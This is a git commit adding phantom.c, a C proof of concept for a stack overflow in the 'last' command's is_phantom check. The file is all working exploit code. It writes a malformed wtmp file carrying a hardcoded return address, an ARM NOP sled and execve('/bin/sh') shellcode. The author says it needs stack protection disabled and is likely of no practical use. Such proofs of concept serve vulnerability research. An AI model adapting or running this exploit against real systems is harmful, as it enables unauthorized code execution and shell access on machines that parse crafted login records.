128e1e76ee918d954e64526b408fe423972e641f
catatonicprime <catatonicprime@gmail.com>
2020-07-08 11:30:00 -0700

    Initial PoC for last is_phantom bug.

---
+++ phantom.c
@@ -0,0 +1,64 @@
+#include <utmpx.h>
+#include <stdio.h>
+#include <pwd.h>
+#include <stdlib.h>
+#include <malloc.h>
+#include <string.h>
+#include <wchar.h>
+
+#define UT_COUNT 2
+
+// Description:
+// A toy exploit for the 'last' command is_phantom stack overflow vulnerability (last.c:633).
+// Generates a malformed wtmp file named mtmp (malformed-tmp)
+// last needs to be compiled with flags "-O0 -fno-stack-protector"
+// ASLR might be a thing too... basically, there is likely no practial use for this.
+
+int main(int argc, char **argv) {
+// Execve from https://azeria-labs.com/writing-arm-shellcode/
+// thumb mode
+    unsigned char shellcode[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";
+	struct utmpx *ut;
+	struct passwd *pw;
+	FILE *fp;
+	int n;
+    int sc_size;
+    int ut_size;
+
+    printf("Phantom stack around: %p\n", &ut);
+    sc_size = sizeof(shellcode) - 1; // ignore the null
+    ut_size = sizeof(struct utmpx); // ignore the null
+	ut = calloc(UT_COUNT, ut_size);
+
+	if (ut == NULL) return -1;
+	
+	printf("Allocated ut: %p\n", ut);
+
+	//Prepare the space...
+	ut->ut_type = USER_PROCESS;
+	memset(ut, 0x61, ut_size);
+	strcpy(ut->ut_user,"phantom\xa4\x25\x8c\x7eZ"); //0x7e8c25a4
+  // Build an ARM mode sled...
+	wmemset((wchar_t *)&ut->ut_host, 0xe1a01001, __UT_HOSTSIZE / sizeof(wchar_t));
+    memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], shellcode, sc_size);
+
+	//Pre-flight checks
+	pw = getpwnam(ut->ut_user);
+	if (pw == NULL) {
+		printf("Failed to get user '%s' from /etc/passwd\n", ut->ut_user);
+		return -1;
+	}
+	
+	fp = fopen("mtmp", "w");
+	if (fp == NULL)	{
+		printf("Failed to open...\n");
+		return -1;
+	}
+	
+	n = fwrite(ut, sizeof(struct utmpx), UT_COUNT, fp);
+	if (n < UT_COUNT) {
+		printf("Failed to write expected size... wrote: %d\n", n);
+		return -1;
+	}
+	fclose(fp);
+}
